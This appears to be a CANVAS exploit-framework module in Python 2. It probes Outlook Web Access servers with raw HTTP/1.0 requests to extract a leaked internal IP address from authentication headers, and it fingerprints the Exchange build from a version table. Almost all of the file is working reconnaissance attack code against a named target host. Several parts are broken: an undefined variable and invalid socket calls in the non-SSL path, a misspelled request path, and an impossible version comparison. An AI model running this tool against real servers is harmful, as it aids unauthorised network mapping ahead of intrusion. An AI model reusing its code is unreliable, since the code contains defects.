#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: sys.path.append(".")
import os, socket, time, re, ssl, urllib2

import timeoutsocket
from exploitutils import *
import canvasengine

from canvasexploit import canvasexploit
from tcpexploit import tcpexploit
from contextlib import contextmanager

NAME        = "OWA IP Leak"
DESCRIPTION = "Outlook Web Access can leak an internal IP when processing a request"
VERSION     = "1.0"

DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = "Microsoft"
DOCUMENTATION["Date public"]   = "00/00/00"
DOCUMENTATION["CERT Advisory"] = "None"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["References"]    = "http://packetstormsecurity.com/files/download/127733/Exchange_Internal_IP_Disclosure-Nate_Power-2014.pdf"
DOCUMENTATION["CVE Name"]      = "None"
DOCUMENTATION["CVE Url"]       = "None"
DOCUMENTATION["Notes"]         = """
When making a HTTP/1.0 request to certain OWA files/paths the server will leak the internal IP via a www-authenticate header response

Note: In some configurations the public IP is the IP assigned to the network adapter, therefore there may be no 'internal IP' to leak. This module checks for that condition.

Because this uses Python sockets you can not run this module from a compromised node (i.e. no bouncing)

Exchange build date and versioning information collected by Michel de Rooij at http://eightwone.com/references/versions-builds-dates/
"""

PROPERTY            = {}
PROPERTY["TYPE"]    = "Recon"
PROPERTY["SITE"]    =  "Remote"
PROPERTY["ARCH"]    = [ ["All"] ]
PROPERTY["VERSION"] = []

targets = {}

TIMEOUT = 10 # sanity for our sockets
@contextmanager
def no_timeout_socket():
    old           = socket.socket
    socket.socket = socket._no_timeoutsocket
    try:
        yield
    finally:
        socket.socket = old


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name     = NAME
        self.debug    = False
        self.ssl      = None
        self.owapath  = ""
        self.paths    = ["Autodiscover/", "Autodiscover/Autodiscover.xml",
                         "Microsoft-Server-ActiveSync", "Microsoft-Server-ActriveSync/default.eas",
                         "ECP", "EWS", "EWS/Exchange.asmx","Exchange", "OWA"]
        self.hostname = ""
        self.hostaddr = ""
        self.build    = None # Build number for OWA if we encounter one

    def getargs(self):
        self.getarg("ssl")
        if self.ssl != "True":
            self.ssl = False
        self.getarg("hostname")
        self.getarg("owapath")
        if self.owapath[0] != "/":
            self.owapath = "/" + self.owapath

        self.host = self.target.interface
        self.node = self.argsDict["passednodes"][0]
        return 
    
    def usage(self):
        """
        We need a bit more information than just the target's IP
        """
        print "="*10
        print "OWA will leak its internal IP address in response to a HTTP/1.0 request for certain paths/files"
        print "-O hostname:<target hostname>"
        print "-O owapath:</path/to/owa>"
        print "-O ssl:<True/False>"
        print "="*10

    def owaBuildLookup(self):
        """
        Major builds of exchange and their build dates
        Thanks to Michel de Rooij: http://eightwone.com/references/versions-builds-dates/ for the table
        """
        builds = {}

        # 2000
        builds["6.0.6249"]    = {"Version" : "2000 SP3", "Release" : "August, 2002"}
        builds["6.0.6620.15"] = {"Version" : "2000 SP3 Final", "Release" : "April, 2010"}

        # 2003
        builds["6.5.6944"]    = {"Version" : "2003 RTM", "Release" : "October, 2003"}
        builds["6.5.7226"]    = {"Version" : "2003 SP1", "Release" : "May, 2004"}
        builds["6.5.7638"]    = {"Version" : "2003 SP2", "Release" : "October, 2005"}
        builds["6.5.7653.33"] = {"Version" : "2003 SP2+", "Release" : "March, 2008"}
        builds["6.5.7654.4"]  = {"Version" : "2003 SP2++", "Release" : "August, 2008"}
        builds["6.5.7656.2"]  = {"Version" : "2003 SP2 Final", "Release" : "April, 2010"}

        # 2007
        builds["8.0.685.24"] = {"Version" : "2007 RTM", "Release" : "December, 2006"}
        builds["8.0.685.25"] = {"Version" : "2007 RTM", "Release" : "December, 2006"}
        builds["8.0.708.3"]  = {"Version" : "2007 RU1", "Release" : "April, 2007"}
        builds["8.0.711.2"]  = {"Version" : "2007 RU2", "Release" : "May, 2007"}
        builds["8.0.730.1"]  = {"Version" : "2007 RU3", "Release" : "June, 2007"}
        builds["8.0.744.0"]  = {"Version" : "2007 RU4", "Release" : "August, 2007"}
        builds["8.0.754.0"]  = {"Version" : "2007 RU5", "Release" : "October, 2007"}
        builds["8.0.783.2"]  = {"Version" : "2007 RU6", "Release" : "February, 2008"}
        builds["8.0.813.0"]  = {"Version" : "2007 RU7", "Release" : "July, 2008"}
        builds["8.1.240.6"]  = {"Version" : "2007 SP1", "Release" : "November, 2007"}
        builds["8.1.263.1"]  = {"Version" : "2007 SP1 RU1", "Release" : "February, 2008"}
        builds["8.1.278.2"]  = {"Version" : "2007 SP1 RU2", "Release" : "May, 2008"}
        builds["8.1.291.2"]  = {"Version" : "2007 SP1 RU3", "Release" : "July, 2008"}
        builds["8.1.311.3"]  = {"Version" : "2007 SP1 RU4", "Release" : "October, 2008"}
        builds["8.1.336.1"]  = {"Version" : "2007 SP1 RU5", "Release" : "November, 2008"}
        builds["8.1.340.1"]  = {"Version" : "2007 SP1 RU6", "Release" : "February, 2009"}
        builds["8.1.359.2"]  = {"Version" : "2007 SP1 RU7", "Release" : "March, 2009"}
        builds["8.1.375.2"]  = {"Version" : "2007 SP1 RU8", "Release" : "May, 2009"}
        builds["8.1.393.1"]  = {"Version" : "2007 SP1 RU9", "Release" : "July, 2009"}
        builds["8.1.436.0"]  = {"Version" : "2007 SP1 RU10", "Release" : "April, 2010"}
        builds["8.2.176.2"]  = {"Version" : "2007 SP2", "Release" : "August, 2009"}
        builds["8.2.217.3"]  = {"Version" : "2007 SP2 RU1", "Release" : "November, 2009"}
        builds["8.2.234.1"]  = {"Version" : "2007 SP2 RU2", "Release" : "January, 2010"}
        builds["8.2.247.2"]  = {"Version" : "2007 SP2 RU3", "Release" : "March, 2010"}
        builds["8.2.254.0"]  = {"Version" : "2007 SP2 RU4", "Release" : "April, 2010"}
        builds["8.2.305.03"] = {"Version" : "2007 SP2 RU5", "Release" : "December, 2010"}
        builds["8.3.83.6"]   = {"Version" : "2007 SP3", "Release" : "June, 2010"}
        builds["8.3.106.2"]  = {"Version" : "2007 SP3 RU1", "Release" : "September, 2010"}
        builds["8.3.137.3"]  = {"Version" : "2007 SP3 RU2", "Release" : "December, 2010"}
        builds["8.3.159.0"]  = {"Version" : "2007 SP3 RU3 v1", "Release" : "February, 2011"}
        builds["8.3.159.2"]  = {"Version" : "2007 SP3 RU3 v2", "Release" : "April, 2011"}
        builds["8.3.192.1"]  = {"Version" : "2007 SP3 RU4", "Release" : "July, 2011"}
        builds["8.3.213.1"]  = {"Version" : "2007 SP3 RU5", "Release" : "September, 2011"}
        builds["8.3.245.2"]  = {"Version" : "2007 SP3 RU6", "Release" : "January, 2012"}
        builds["8.3.264.0"]  = {"Version" : "2007 SP3 RU7", "Release" : "April, 2012"}
        builds["8.3.279.3"]  = {"Version" : "2007 SP3 RU8 v1", "Release" : "August, 2012"}
        builds["8.3.279.5"]  = {"Version" : "2007 SP3 RU8 v2", "Release" : "October, 2012"}
        builds["8.3.279.6"]  = {"Version" : "2007 SP3 RU8 v3", "Release" : "November, 2012"}
        builds["8.3.297.2"]  = {"Version" : "2007 SP3 RU9", "Release" : "December, 2012"}
        builds["8.3.298.3"]  = {"Version" : "2007 SP3 RU10", "Release" : "February, 2013"}
        builds["8.3.327.1"]  = {"Version" : "2007 SP3 RU11", "Release" : "August, 2013"}
        builds["8.3.342.4"]  = {"Version" : "2007 SP3 RU12", "Release" : "December, 2013"}
        builds["8.3.348.2"]  = {"Version" : "2007 SP3 RU13", "Release" : "February, 2014"}

        # 2010
        builds["14.0.639.21"] = {"Version" : "2010 RTM", "Release" : "October, 2009"}
        builds["14.0.682.1"]  = {"Version" : "2010 RU1", "Release" : "December, 2009"}
        builds["14.0.689.0"]  = {"Version" : "2010 RU2", "Release" : "March, 2010"}
        builds["14.0.694.0"]  = {"Version" : "2010 RU3", "Release" : "April, 2010"}
        builds["14.0.702.1"]  = {"Version" : "2010 RU4", "Release" : "June, 2010"}
        builds["14.0.726.0"]  = {"Version" : "2010 RU5", "Release" : "December, 2010"}
        builds["14.1.218.15"] = {"Version" : "2010 SP1", "Release" : "August, 2010"}
        builds["14.1.255.2"]  = {"Version" : "2010 SP1 RU1", "Release" : "October, 2010"}
        builds["14.1.270.1"]  = {"Version" : "2010 SP1 RU2", "Release" : "December, 2010"}
        builds["14.1.289.3"]  = {"Version" : "2010 SP1 RU3 v1", "Release" : "February, 2011"}
        builds["14.1.289.7"]  = {"Version" : "2010 SP1 RU3 v3", "Release" : "April, 2011"}
        builds["14.1.323.1"]  = {"Version" : "2010 SP1 RU4 v1", "Release" : "June, 2011"}
        builds["14.1.323.6"]  = {"Version" : "2010 SP1 RU4 v2", "Release" : "July, 2011"}
        builds["14.1.339.1"]  = {"Version" : "2010 SP1 RU5", "Release" : "August, 2011"}
        builds["14.1.355.2"]  = {"Version" : "2010 SP1 RU6", "Release" : "October, 2011"}
        builds["14.1.421.0"]  = {"Version" : "2010 SP1 RU7 v1", "Release" : "August, 2012"}
        builds["14.1.421.2"]  = {"Version" : "2010 SP1 RU7 v2", "Release" : "October, 2012"}
        builds["14.1.438.0"]  = {"Version" : "2010 SP1 RU8", "Release" : "December, 2012"}
        builds["14.2.247.5"]  = {"Version" : "2010 SP2", "Release" : "December, 2011"}
        builds["14.2.283.3"]  = {"Version" : "2010 SP2 RU1", "Release" : "February, 2012"}
        builds["14.2.298.4"]  = {"Version" : "2010 SP2 RU2", "Release" : "April, 2012"}
        builds["14.2.309.2"]  = {"Version" : "2010 SP2 RU3", "Release" : "May, 2012"}
        builds["14.2.318.2"]  = {"Version" : "2010 SP2 RU4 v1", "Release" : "August, 2012"}
        builds["14.2.318.4"]  = {"Version" : "2010 SP2 RU4 v2", "Release" : "October, 2012"}
        builds["14.2.328.5"]  = {"Version" : "2010 SP2 RU5 v1", "Release" : "November, 2012"}
        builds["14.2.328.10"] = {"Version" : "2010 SP2 RU5 v2", "Release" : "December, 2012"}
        builds["14.2.342.3"]  = {"Version" : "2010 SP2 RU6", "Release" : "February, 2013"}
        builds["14.2.375.0"]  = {"Version" : "2010 SP2 RU7", "Release" : "August, 2013"}
        builds["14.2.390.3"]  = {"Version" : "2010 SP2 RU8", "Release" : "December, 2013"}
        builds["14.3.123.4"]  = {"Version" : "2010 SP3", "Release" : "February, 2013"}
        builds["14.3.146.0"]  = {"Version" : "2010 SP3 RU1", "Release" : "May, 2013"}
        builds["14.3.158.1"]  = {"Version" : "2010 SP3 RU2", "Release" : "August, 2013"}
        builds["14.3.169.1"]  = {"Version" : "2010 SP3 RU3", "Release" : "November, 2013"}
        builds["14.3.174.1"]  = {"Version" : "2010 SP3 RU4", "Release" : "December, 2013"}
        builds["14.3.181.6"]  = {"Version" : "2010 SP3 RU5", "Release" : "February, 2014"}
        builds["14.3.195.1"]  = {"Version" : "2010 SP3 RU6", "Release" : "May, 2014"}
   
        # 2013
        builds["15.0.516.32"] = {"Version" : "2013 RTM", "Release" : "October, 2012"}
        builds["15.0.620.29"] = {"Version" : "2013 CU1", "Release" : "April, 2013"}
        builds["15.0.620.34"] = {"Version" : "2013 CU1 + KB2874216 v2", "Release" : "August, 2013"}
        builds["15.0.712.22"] = {"Version" : "2013 CU2 v1", "Release" : "July, 2013"}
        builds["15.0.712.24"] = {"Version" : "2013 CU2 v2", "Release" : "July, 2013"}
        builds["15.0.712.28"] = {"Version" : "2013 CU2 + KB2874216 v2", "Release" : "August, 2013"}
        builds["15.0.712.31"] = {"Version" : "2013 CU2 + KB2880833", "Release" : "December, 2013"}
        builds["15.0.775.38"] = {"Version" : "2013 CU3", "Release" : "November, 2013"}
        builds["15.0.775.41"] = {"Version" : "2013 CU3 KB2880833", "Release" : "December, 2013"}
        builds["15.0.847.32"] = {"Version" : "2013 CU4", "Release" : "February, 2014"}
        builds["15.0.913.22"] = {"Version" : "2013 CU5", "Release" : "May, 2014"} 

        if builds.has_key(self.build):
            self.log("Build number %s corresponds to Exchange %s , released %s"%(self.build,
                                                                                 builds[self.build]["Version"],
                                                                                 builds[self.build]["Release"]))
        else:
            msg = self.owaFuzzyMatch()
            self.log(msg)
        return

    def owaFuzzyMatch(self):
        """
        Do major/minor version number matching
        """
        major = int(self.build.split(".")[0])
        minor = int(self.build.split(".")[1])
        branch = int(self.build.split(".")[2])
        if major == 6 and minor == 0:
            return "Exchange 2000"
        elif major == 6 and minor == 5:
            if branch == 6944:
                return "Near Exchange 2003 SP3 RTM"
            elif branch > 6944 and branch < 7226:
                return "Between Exchange 2003 RTM and SP1"
            elif branch > 7226 and branch < 7638:
                return "Between Exchange 2003 SP1 and SP2"
            elif branch > 7638 and branch < 7565:
                return "Between Exchange 2003 SP2 and Exchange 2003 SP2 Final"
        elif major == 8 and minor == 0:
            return "Between Exchange 2007 RTM and 2007 SP1"
        elif major == 8 and minor == 1:
            return "Between Exchange 2007 SP1 and SP2"
        elif major == 8 and minor == 2:
            return "Between Exchange 2007 SP2 and SP3"
        elif major == 8 and minor == 3:
            return "Exchange 2007 post SP3"
        elif major == 14 and minor == 0:
            return "Between Exchange 2010 RTM and SP1"
        elif major == 14 and minor == 1:
            return "Between Exchange 2010 SP1 and SP2"
        elif major == 14 and minor == 2:
            return "Between Exchange 2010 SP2 and SP3"
        elif major == 14 and minor == 3:
            return "Exchange 2010 post SP3"
        elif major == 15 and minor == 0:
            return "Exchange 2013"
        return "Unable to match via fuzzy logic, check Google"

    def testUrl(self):
        """
        Let's make sure the supplied host is reachable and looks like an OWA page
        """
        ret = None
        e   = None
        with no_timeout_socket():
            self.hostaddr = socket.gethostbyname(self.hostname)
            if self.debug:
                self.log("testUrl() Fetching: %s"%(self.hostname + self.owapath))
            try:
                if self.ssl:
                    ret = urllib2.urlopen("https://" + self.hostname + self.owapath)
                else:
                    ret = urllib2.urlopen("http://" + self.hostname + self.owapath)
            except urllib2.HTTPError as e:
                if e.code == 401:
                    pass
            except Exception as e:
                self.log(e.message)
                return False

            if ret and ret.headers.has_key("X-OWA-Version"):
                self.build = ret.headers['X-OWA-Version']
                self.log("Found X-OWA-Version %s"%ret.headers['X-OWA-Version'])
                return True
            elif ret and ret.headers.has_key('Set-Cookie') and 'OutlookSession' in ret.headers['Set-Cookie']:
                self.log("Found the OutlookSession cookie, we're in the right spot")
                return True
            elif ((e and e.code == 401) or (ret and ret.code == 401)):
                self.log("Did not find X-OWA-Version header nor the OutlookSession cookie")
                self.log("We did receive an HTTP 401, trying the test anyway")
                return True
            else:
                self.log("This site does not appear to be the standard OWA login page")
        return False

    def sslHost(self):
        """
        OWA will almost always be via SSL so this should be the most common function
        """
        data = None
        results = [] # We may encounter a situation where we get IPs and hostnames
        fixedHostname = self.hostname.replace(self.owapath, "")
        with no_timeout_socket():
            for path in self.paths:
                try:
                    # I had issues getting this to work via the regular http libs
                    # doing it via a socket + ssl was easier and straight forward
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ssl_sock = ssl.wrap_socket(s, ca_certs=None)
                    ssl_sock.connect((fixedHostname, 443))
                    fetch = "GET /%s HTTP/1.0\r\n\r\n"%path
                    self.log("Fetching: https://%s/%s"%(self.hostname, path))
                    ssl_sock.write(fetch)
                    data = ssl_sock.read()
                    ssl_sock.close()
                except Exception as e:
                    self.log(e.args)
                    self.log(e.message)
                if data:
                    ret = re.search("realm=\"(.+?)\"", data)
                    if ret and ret.groups()[0] not in results:
                        results.append(ret.groups()[0])
        return results

    def plainHost(self):
        """
        Hopefully there's no OWA running without SSL exposed to the internet, but you never know
        """
        data = None
        fixedHostname = self.hostname.replace(self.owapath, "")
        with no_timeout_socket():
            for path in self.paths:
                try:
                    # I had issues getting this to work via the regular httplibs
                    # doing it via a socket was easier and straight forward
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((fixedHostname, 80))
                    fetch = "GET /%s HTTP/1.0\r\n\r\n"%path
                    self.log("Fetching: http://%s/%s"%(self.hostname, path))
                    s.write(fetch)
                    data = s.read()
                    s.close()
                except Exception as e:
                    self.log(e.args)
                    self.log(e.message)
                if data:
                    ret = re.search("realm=\"(.+?)\"", data)
                    if ret and ret.groups()[0] not in results:
                        results.append(ret.groups()[0])
        return results

    def parseResults(self, results):
        """
        Run some simple tests to see if we got anything useful
        """
        ips = []
        foundInternal = False
        for result in results:
            try:
                socket.inet_aton(result)
                ips.append(result)
            except socket.error:
                # We did not encounter an IP
                pass
        if len(ips) == 0:
            self.log("Only encountered hostnames as a response")
            for result in results:
                self.log(result)
            return 0
        else:
            for ip in ips:
                if ip != self.hostaddr:
                    self.log("Found an IP that does not match the public IP: %s"%ip)
                    foundInternal = True

        if foundInternal:
            return 1
        else:
            self.log("All IPs discovered were the public IPs :(")
            return 0

    def run(self):
        self.getargs()
        if self.testUrl():
            if self.build:
                # If we find a build number via the OWA header spit out release info
                self.owaBuildLookup()

            if self.ssl:
                results = self.sslHost()                
            else:
                results = self.plainHost()
        else:
            self.log("Unable to proceed due to error, check CANVAS.log")
            return 0

        if len(results) > 0:
            if self.parseResults(results):
                return 1
            else:
                return 0
        else:
            self.log("We did not encounter an HTTP header which leaked the IP :(")
            return 0

        return 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
